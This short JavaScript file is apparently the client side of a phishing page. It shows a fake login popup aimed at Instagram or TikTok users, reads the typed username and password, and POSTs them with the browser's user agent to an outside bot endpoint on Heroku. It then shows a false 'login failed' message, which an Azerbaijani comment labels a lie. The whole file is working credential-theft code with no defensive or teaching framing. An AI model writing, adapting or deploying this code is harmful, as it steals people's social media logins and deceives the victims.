function showLogin() {
    document.getElementById('loginPopup').style.display = 'flex';
}

function submitLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    if (username && password) {
        // Məlumatları bota göndər
        fetch('https://your-bot-endpoint.herokuapp.com/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password, platform: 'instagram/tiktok', userAgent: navigator.userAgent })
        }).then(() => {
            alert('Giriş uğursuz oldu. Yenidən cəhd edin.'); // yalan xəbər
            document.getElementById('loginPopup').style.display = 'none';
        });
    }
}
